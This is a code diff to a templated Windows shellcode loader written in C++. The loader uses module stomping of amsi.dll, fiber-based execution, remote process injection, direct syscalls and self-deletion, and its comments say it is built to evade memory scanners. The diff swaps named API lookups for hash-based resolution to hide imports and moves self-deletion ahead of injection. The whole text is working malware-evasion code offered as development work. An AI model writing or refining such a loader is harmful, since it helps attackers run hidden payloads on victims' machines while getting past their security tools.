@@ -5,6 +5,7 @@
 #include <tlhelp32.h>
 
 #include "obfuscate.hpp.in"
+#include "api_hashing.hpp.in"
 #include "syscalls.hpp.in"
 #include "crypto_stub.hpp.in"
 #include "common.hpp.in"
@@ -204,8 +205,8 @@ static void execute_local() {
 {{#IF MODULE_STOMP}}
     // Module Stomping: load a sacrificial DLL, overwrite its .text section
     // Makes shellcode memory appear file-backed (evades unbacked-memory scanners)
-    HMODULE hSacrifice = LoadLibraryW(obf_wide(L"amsi.dll"));
-    if (!hSacrifice) hSacrifice = LoadLibraryW(obf_wide(L"dbghelp.dll"));
+    HMODULE hSacrifice = load_module(L"amsi.dll");
+    if (!hSacrifice) hSacrifice = load_module(L"dbghelp.dll");
     if (!hSacrifice) return;
 
     auto s_dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hSacrifice);
@@ -331,15 +332,15 @@ static void execute_local() {
         using CreateFiber_t = LPVOID(WINAPI*)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
         using ConvertFiberToThread_t = BOOL(WINAPI*)();
 
-        HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
+        HMODULE hK32 = resolve_module(HASHA("KERNEL32.DLL"));
         auto pCTF = reinterpret_cast<ConvertThreadToFiber_t>(
-            GetProcAddress(hK32, obf("ConvertThreadToFiber")));
+            resolve_function(hK32, HASHA("ConvertThreadToFiber")));
         auto pCF = reinterpret_cast<CreateFiber_t>(
-            GetProcAddress(hK32, obf("CreateFiber")));
+            resolve_function(hK32, HASHA("CreateFiber")));
         auto pSF = reinterpret_cast<SwitchToFiber_t>(
-            GetProcAddress(hK32, obf("SwitchToFiber")));
+            resolve_function(hK32, HASHA("SwitchToFiber")));
         auto pCFT = reinterpret_cast<ConvertFiberToThread_t>(
-            GetProcAddress(hK32, obf("ConvertFiberToThread")));
+            resolve_function(hK32, HASHA("ConvertFiberToThread")));
         if (!pCTF || !pCF || !pSF) return;
 
         LPVOID mainFiber = pCTF(NULL);
@@ -352,7 +353,7 @@ static void execute_local() {
         LPVOID scFiber = pCF(0, fiber_trampoline, &g_fiber_ctx);
         if (!scFiber) { if (pCFT) pCFT(); return; }
         pSF(scFiber);
-        // Don't DeleteFiber — shellcode threads may reference fiber stack data
+        // Don't DeleteFiber - shellcode threads may reference fiber stack data
         if (pCFT) pCFT();
     }
 {{#ENDIF}}
@@ -384,13 +385,13 @@ static void execute_remote() {
     using Process32FirstW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
     using Process32NextW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
 
-    HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
+    HMODULE hK32 = resolve_module(HASHA("KERNEL32.DLL"));
     auto pSnap = reinterpret_cast<CreateToolhelp32Snapshot_t>(
-        GetProcAddress(hK32, obf("CreateToolhelp32Snapshot")));
+        resolve_function(hK32, HASHA("CreateToolhelp32Snapshot")));
     auto pFirst = reinterpret_cast<Process32FirstW_t>(
-        GetProcAddress(hK32, obf("Process32FirstW")));
+        resolve_function(hK32, HASHA("Process32FirstW")));
     auto pNext = reinterpret_cast<Process32NextW_t>(
-        GetProcAddress(hK32, obf("Process32NextW")));
+        resolve_function(hK32, HASHA("Process32NextW")));
 
     if (!pSnap || !pFirst || !pNext) return;
 
@@ -553,15 +554,15 @@ static void run_payload() {
         g_initialized = true;
     }
 
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
 {{#IF LOCAL_INJECT}}
     execute_local();
 {{#ENDIF}}
 {{#IF REMOTE_INJECT}}
     execute_remote();
-{{#ENDIF}}
-
-{{#IF SELF_DELETE}}
-    self_delete();
 {{#ENDIF}}
 
     // Keep alive for shellcode threads
@@ -570,7 +571,7 @@ static void run_payload() {
     auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
     for (;;) {
         if (NtDE) NtDE(FALSE, &wait);
-        else Sleep(60000);
+        else sleep_ms(60000);
     }
 }
 
@@ -589,15 +590,15 @@ int main() {
     if (!init_syscalls()) return 1;
     if (!evasion_init()) return 1;
 
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
 {{#IF LOCAL_INJECT}}
     execute_local();
 {{#ENDIF}}
 {{#IF REMOTE_INJECT}}
     execute_remote();
-{{#ENDIF}}
-
-{{#IF SELF_DELETE}}
-    self_delete();
 {{#ENDIF}}
 
     // Keep process alive for shellcode that spawns threads (staged payloads)
@@ -606,7 +607,7 @@ int main() {
     auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
     for (;;) {
         if (NtDE) NtDE(FALSE, &wait);
-        else Sleep(60000);
+        else sleep_ms(60000);
     }
 }
 {{#ENDIF}}
